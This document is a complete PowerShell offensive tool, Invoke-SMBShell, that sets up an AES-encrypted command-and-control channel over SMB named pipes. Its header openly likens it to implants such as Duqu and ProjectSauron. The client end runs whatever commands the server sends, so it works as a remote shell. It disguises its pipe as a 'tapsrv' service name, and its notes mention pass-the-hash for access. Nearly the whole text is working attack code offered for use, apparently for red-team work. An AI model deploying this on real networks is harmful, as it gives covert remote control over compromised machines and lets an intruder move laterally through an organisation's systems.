function Invoke-SMBShell {
<#
.SYNOPSIS
	Invoke-SMBShell uses named pipes to create an SMB C2 channel. The SMB
	traffic is encrypted using AES CBC (code from Empire), the key/pipe
	are generated randomly by the server on start-up.

	This is a crude POC, in the wild malware like Duqu or ProjectSauron
	use this technique to create an internal C&C which implants can
	connect to. The C&C then acts as an outbound proxy for the malicious
	traffic. Given time, I'd like to implement much the same thing,
	perhaps as a proxy for Empire agents.

	Notes:

	* To connect, the client needs to be able to initialise an SMB
	  connection to the target (eg: net use \\server\share). Such
	  A connection could be made with different user credentials
	  or by passing the hash/ticket. Not unreasonable in a corporate
	  environment.

	Limitations:

	* Currently the named pipe is not asynchronous so only one client
	  at a time.

	* The shell doesn't yet have a concept of long running jobs, all
	  commands are handed off as jobs and the output is retrieved
	  once finished.

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	Server mode, hosts the named pipe.

	C:\PS> Invoke-SMBShell

.EXAMPLE
	Client mode, connects to the named pipe.

	C:\PS> Invoke-SMBShell -Client -Server REDRUM-DC -AESKey dFqeSRa5IVD7Daby -Pipe tapsrv.5604.w6YjHCgSOVpoXOZF
#>

	[CmdletBinding(DefaultParametersetName='Server')]
	param( 
		[Parameter(ParameterSetName='Client',Mandatory=$false)]
		[switch]$Client,
		[Parameter(ParameterSetName='Client',Mandatory=$true)]
		[string]$Server,
		[Parameter(ParameterSetName='Client',Mandatory=$true)]
		[string]$AESKey,
		[Parameter(ParameterSetName='Client',Mandatory=$true)]
		[string]$Pipe
	)

	# Set the function Mode
	$PipeMode = $PsCmdLet.ParameterSetName

	# Crypto functions from Empire agent
	# https://github.com/PowerShellEmpire/Empire/blob/master/data/agent/agent.ps1#L514
	function Encrypt-Bytes {
		param($bytes)
		# get a random IV
		$IV = [byte] 0..255 | Get-Random -count 16
		$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
		$AES.Mode = "CBC";
		$AES.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
		$AES.IV = $IV;
		$ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
		# append the MAC
		$hmac = New-Object System.Security.Cryptography.HMACSHA1;
		$hmac.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
		$ciphertext + $hmac.ComputeHash($ciphertext);
	}

	function Decrypt-Bytes {
		param ($inBytes)
		if($inBytes.Length -gt 32){
			# Verify the MAC
			$mac = $inBytes[-20..-1];
			$inBytes = $inBytes[0..($inBytes.length - 21)];
			$hmac = New-Object System.Security.Cryptography.HMACSHA1;
			$hmac.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
			$expected = $hmac.ComputeHash($inBytes);
			if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
				return;
			}
	
			# extract the IV
			$IV = $inBytes[0..15];
			$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
			$AES.Mode = "CBC";
			$AES.Key = [system.Text.Encoding]::UTF8.GetBytes($AESKey);
			$AES.IV = $IV;
			($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
		}
	}

	# Generate 16 friendly random characters
	function Random-16 {
		$Seed = 1..16|ForEach-Object{Get-Random -max 62};
		$CharSet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
		$CharSet[$Seed] -join ""
	}

	# Write pipe helper function
	function Write-Data {
		param ($data)
		$Input = Encrypt-Bytes -bytes $([system.Text.Encoding]::UTF8.GetBytes($data))
		$Input = ($Input -join ' ' |Out-String).trim()
		$Input
	}

	# Read pipe helper function
	function Read-Data {
		param ($data)
		$data = $data -split ' '
		$OutPut = [System.Text.Encoding]::UTF8.GetString($(Decrypt-Bytes -inBytes $data))
		$OutPut
	}

	# Job are used here to support long running commands but
	# for now the shell doesn't have logic to specifically
	# invoke a job for such commands and IEX for others.
	function Command-Handler {
		param($data)
		$JobName = "SMBJob-$(Random-16)"
		$PoshJob = Start-Job -Name $JobName -Scriptblock ([scriptblock]::Create($data))
		Wait-Job -Name $PoshJob.Name| Out-Null

		if ($((Get-Job $PoshJob.Name).HasMoreData) -eq $true) {
			# On Win10+ even jobs with no results show HasMoreData=True
			$JobResult = $(Receive-Job -Name $PoshJob.Name 2>&1|Out-String)
			if (!$JobResult) {
				echo "Job $($PoshJob.Name) completed successfully!"
			} else {
				$JobResult.trim()
			}
		} else {
			if($((Get-Job $PoshJob.Name).State) -eq "Failed"){
				(Get-Job $PoshJob.Name).ChildJobs[0].JobStateInfo.Reason.Message
			} else {
				echo "Job $($PoshJob.Name) completed successfully!"
			}
		}
		
		Remove-Job -Name $PoshJob.Name
	}

	function Initialize-Pipe {
		if ($PipeMode -eq "Server") {
			echo "`n[>] Waiting for client..`n"
			$PipeObject.WaitForConnection()
		} else {
			try {
			# Add a 5s time-out in case the server is not live
			$PipeObject.Connect(5000)
			} catch {
				echo "[!] Server pipe not available!"
				Return
			}
		}

		$PipeReader = $PipeWriter = $null
		$PipeReader = new-object System.IO.StreamReader($PipeObject)
		$PipeWriter = new-object System.IO.StreamWriter($PipeObject)
		$PipeWriter.AutoFlush = $true

		Initialize-Session
	}

	function Initialize-Session {
		try {
			while($true) {

				# Server logic
				if ($PipeMode -eq "Server") {
					$Command = Read-Host "`nSMB shell"
					if ($Command) {
						$PipeWriter.WriteLine($(Write-Data -data $Command))
						Read-Data -data $($PipeReader.ReadLine())
						# Kill server and client
						if ($Command -eq "exit") {
							echo "[!] Terminating server..`n"
							break
						}
						# Disconnect client
						if ($Command -eq "leave") {
							break
						}
					}
				}

				# Client logic
				else {
					$Command = $pipeReader.ReadLine()
					if ($Command) {
						if ($(Read-Data -data $command) -eq "leave" -or $(Read-Data -data $command) -eq "exit") {
							$PipeWriter.WriteLine($(Write-Data -data "`n[!] Client disconnecting.."))
							break
						} else {
							$Result = Command-Handler -data $(Read-Data -data $Command)
							$PipeWriter.WriteLine($(Write-Data -data $Result))
						}
					}
				}
			}
		}

		catch {
			# Shit happens! Error logic goes here .. at some point!
		}

		# Cleanup & leave logic
		finally {
			if ($PipeMode -eq "Server") {
				if ($Command -eq "exit") {
					$PipeObject.Dispose()
				# This else also recovers the server pipe
				# should the client fail for some reason
				} else {
					$PipeObject.Disconnect()
					Initialize-Pipe
				}
			} else {
				$PipeObject.Dispose()
			}
		}
	}

	# Generate Key/Pipe
	if ($PipeMode -eq "Server") {
		$AESKey = Random-16
		$Pipe = "tapsrv.5604.$(Random-16)"
		$PipeObject = New-Object System.IO.Pipes.NamedPipeServerStream($Pipe, [System.IO.Pipes.PipeDirection]::InOut)
		$ServerConfig = @"

+-------
| Host Name: $Env:COMPUTERNAME
| Named Pipe: $Pipe
| AES Key: $AESKey
+-------
"@
		$ServerConfig
	} else {
		$PipeObject = new-object System.IO.Pipes.NamedPipeClientStream($Server, $Pipe, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
	}

	Initialize-Pipe
}